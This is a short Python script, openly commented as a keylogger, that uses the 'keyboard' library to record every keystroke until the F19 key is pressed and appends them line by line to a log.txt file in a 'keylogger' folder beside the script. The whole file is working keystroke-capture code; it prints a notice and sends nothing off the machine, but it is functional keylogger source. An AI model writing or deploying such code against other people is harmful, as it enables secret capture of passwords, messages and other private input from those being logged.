import keyboard,os
recKeys = keyboard.record(until='f19')  #  the logger will record until the "f19" key is pressed.
listobj=()                             
keyloggerDir=(os.path.dirname(__file__)+'/keylogger')  #  the path where this file is located.
logPath=(keyloggerDir+'/log.txt')  # log file location.
try:os.makedirs(keyloggerDir)  #  makes a directory for the log.
except FileExistsError:pass
with open(logPath,'a') as log:log.write('='*65+'\n')  #  simply appends a space between logs.
print('Logging keys...')
for i in recKeys:
    listobj=(i)
    listobj=(str(listobj))
    with open(logPath,'a') as log:log.write(listobj+'\n')  #  appends the logged keys to the file.
